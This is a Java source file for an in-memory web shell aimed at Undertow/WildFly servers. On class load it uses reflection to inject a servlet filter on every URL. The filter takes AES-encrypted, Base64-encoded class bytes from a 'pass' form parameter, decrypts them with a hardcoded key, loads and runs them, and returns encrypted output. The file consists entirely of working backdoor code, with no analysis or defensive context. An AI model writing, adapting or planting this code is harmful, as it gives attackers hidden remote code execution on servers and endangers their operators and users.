import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashSet;

//all version undertow/wildfly
public class AesBase64JBossFilterShell extends ClassLoader implements InvocationHandler {
    private static Class payloadClass;
    private String key = "3c6e0b8a9c15224a";
    private String password = "pass";


    static {
        new AesBase64JBossFilterShell().addFilter();
    }

    public AesBase64JBossFilterShell(ClassLoader loader) {
        super(loader);
    }

    public AesBase64JBossFilterShell() {

    }

    private void addFilter() {
        try {
            Class servletFilterClass = null;
            try {
                servletFilterClass = loadClassEx("jakarta.servlet.Filter");
            } catch (Exception e) {
                try {
                    servletFilterClass = loadClassEx("javax.servlet.Filter");
                } catch (ClassNotFoundException ex) {
                }
            }
            if (servletFilterClass != null) {
                addFilter(java.lang.reflect.Proxy.newProxyInstance(servletFilterClass.getClassLoader(), new Class[]{servletFilterClass}, this));
            }
        } catch (Throwable e) {
        }
    }

    private static Object[] getContexts() throws Throwable {
        HashSet contexts = new HashSet();
        Object servletRequestContext = loadClassEx("io.undertow.servlet.handlers.ServletRequestContext").getMethod("current").invoke(null);
        Object currentServletContext = servletRequestContext.getClass().getMethod("getCurrentServletContext").invoke(servletRequestContext);
        contexts.add(currentServletContext);
        return contexts.toArray();
    }

    private boolean addFilter(Object filter) throws Throwable {
        boolean isOk = false;
        try {
            Object[] obj = getContexts();
            for (int i = 0; i < obj.length; i++) {
                Object currentServletContext = obj[i];
                try {
                    Class dispatcherTypeClass = null;
                    try {
                        dispatcherTypeClass = loadClassEx("jakarta.servlet.DispatcherType");
                    } catch (ClassNotFoundException e) {
                        dispatcherTypeClass = loadClassEx("javax.servlet.DispatcherType");
                    }

                    Class filterInfoClass = loadClassEx("io.undertow.servlet.api.FilterInfo");
                    Class instanceFactoryClass = loadClassEx("io.undertow.servlet.api.InstanceFactory");
                    Class immediateInstanceFactoryClass = loadClassEx("io.undertow.servlet.util.ImmediateInstanceFactory");
                    Object deploymentInfo = getFieldValue(currentServletContext, "deploymentInfo");
                    Object immediateInstanceFactory = immediateInstanceFactoryClass.getConstructor(Object.class).newInstance(filter);
                    Class targetFilter = filter.getClass();
                    Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class, instanceFactoryClass).newInstance(targetFilter.getName(), targetFilter, immediateInstanceFactory);
                    deploymentInfo.getClass().getMethod("addFilter", filterInfoClass).invoke(deploymentInfo, filterInfo);
                    Object deploymentImpl = getFieldValue(currentServletContext, "deployment");
                    Object managedFilters = deploymentImpl.getClass().getMethod("getFilters").invoke(deploymentImpl);
                    managedFilters.getClass().getMethod("addFilter", filterInfoClass).invoke(managedFilters, filterInfo);
                    deploymentInfo.getClass().getMethod("insertFilterUrlMapping", int.class, String.class, String.class, dispatcherTypeClass).
                            invoke(deploymentInfo, 0, targetFilter.getName(), "/*", Enum.valueOf(dispatcherTypeClass, "REQUEST"));
                    isOk = true;
                } catch (Throwable e) {

                }
            }
        } catch (Throwable e) {

        }


        return isOk;
    }

    private static Class loadClassEx(String className) throws ClassNotFoundException {
        try {
            return Class.forName(className);
        } catch (Throwable e) {
            try {
                return Class.forName(className, true, Thread.currentThread().getContextClassLoader());
            } catch (Throwable ignored) {
                try {
                    Thread[] threads = new Thread[Thread.activeCount()];
                    Thread.enumerate(threads);
                    for (int i = 0; i < threads.length; i++) {
                        Thread thread = threads[i];
                        if (thread == null) {
                            continue;
                        }
                        try {
                            ClassLoader loader = thread.getContextClassLoader();
                            return loader.loadClass(className);
                        } catch (Throwable ignored2) {

                        }

                    }

                } catch (Throwable ignored2) {

                }
            }

        }
        throw new ClassNotFoundException(className);
    }

    private static Field getField(Object obj, String fieldName) {
        Class clazz = null;

        if (obj == null) {
            return null;
        }

        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null) {
            field.setAccessible(true);
        }

        return field;
    }

    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            f = getField(obj, fieldName);
        }
        if (f != null) {
            return f.get(obj);
        }
        return null;
    }


    private byte[] aes(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    private static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    private static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{
                    byte[].class
            }).invoke(Encoder, new Object[]{
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{
                        byte[].class
                }).invoke(Encoder, new Object[]{
                        bs
                });
            } catch (Exception e2) {
            }
        }
        return value;
    }

    private static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{
                    String.class
            }).invoke(decoder, new Object[]{
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{
                        String.class
                }).invoke(decoder, new Object[]{
                        bs
                });
            } catch (Exception e2) {
            }
        }
        return value;
    }

    private Object invokeMethod(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; i++) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add(null);
                    }
                }
            }
            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[]{}));

            return method.invoke(obj, parameters);
        } catch (Throwable e) {
//        	e.printStackTrace();
        }
        return null;
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;
        while (cs != null) {
            try {
                method = cs.getMethod(methodName, parameters);
                cs = null;
            } catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }

        if (method != null) {
            try {
                method.setAccessible(true);
            } catch (Throwable e) {

            }
        }

        return method;
    }

    private String getParameter(Object requestObject, String name) {
        return (String) invokeMethod(requestObject, "getParameter", name);
    }

    private String getContentType(Object requestObject) {
        return (String) invokeMethod(requestObject, "getContentType");
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("doFilter")) {
            Object servletRequest = args[0];
            Object servletResponse = args[1];
            Object filterChain = args[2];
            if (!run(servletRequest, servletResponse)) {
                Class requestClass = method.getParameterTypes()[0];
                Class responseClass = method.getParameterTypes()[1];

                getMethodByClass(filterChain.getClass(), "doFilter", requestClass, responseClass).invoke(filterChain, servletRequest, servletResponse);
            }
        }
        return null;
    }

    private boolean run(Object request, Object response) {
        try {
            try {
                String contentType = getContentType(request);
                if (contentType != null && contentType.contains("application/x-www-form-urlencoded")) {
                    String value = getParameter(request, password);
                    if (value != null) {
                        byte[] data = base64Decode(value);
                        data = aes(data, false);
                        if (data != null && data.length > 0) {
                            if (payloadClass == null) {
                                ClassLoader loader = Thread.currentThread().getContextClassLoader();
                                if (loader == null) {
                                    loader = request.getClass().getClassLoader();
                                }

                                payloadClass = new AesBase64JBossFilterShell(loader).defineClass(data, 0, data.length);
                            } else {
                                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                                Object f = payloadClass.newInstance();
                                f.equals(arrOut);
                                f.equals(request);
                                f.equals(data);
                                f.toString();
                                String md5 = md5(password + key);
                                if (arrOut.size() > 0) {
                                    PrintWriter printWriter = (PrintWriter) invokeMethod(response, "getWriter");
                                    printWriter.write(md5.substring(0, 16));
                                    printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
                                    printWriter.write(md5.substring(16));
                                    return true;
                                }
                            }
                        }
                    }
                }

            } catch (Throwable ignored) {
            }
        } catch (Throwable ignored) {

        }
        return false;
    }
}
